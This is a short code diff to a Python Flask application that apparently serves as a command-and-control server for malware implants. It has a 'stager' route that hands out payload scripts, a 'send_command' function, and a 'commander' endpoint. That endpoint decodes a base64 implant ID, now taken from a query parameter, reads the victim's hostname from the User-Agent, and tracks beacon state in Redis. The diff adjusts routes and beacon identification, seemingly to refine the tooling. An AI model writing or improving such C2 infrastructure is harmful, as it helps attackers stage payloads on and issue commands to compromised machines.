@@ -10,7 +10,7 @@ r = redis.Redis(host=os.getenv('REDIS_HOST'), port=6379, db=0, decode_responses=
 
 app = Flask(__name__)
 
-@app.route('/<string:script>', methods=['GET'])
+@app.route('/files/<string:script>', methods=['GET'])
 def stager(script):
     return send_from_directory('scripts', script, as_attachment=False)
 
@@ -27,12 +27,13 @@ def send_command():
 
 @app.route('/login', methods=['GET', 'POST'])
 def commander():
-    b64 = base64.b64decode(request.headers.get("X-Client-Data"))
+    b64 = base64.b64decode(request.args.get("uuid"))
     uuid = b64.decode('utf-8')
     if request.method == 'GET':
         raw_profile = request.headers.get("User-Agent").split("/", 3)
         profile = raw_profile[0]
         hostname = raw_profile[2]
+        # ip = request.headers.get("X-Real-IP")
         ip = request.remote_addr
         cache = r.lindex(uuid, -1)
         if r.exists(uuid) == 0:
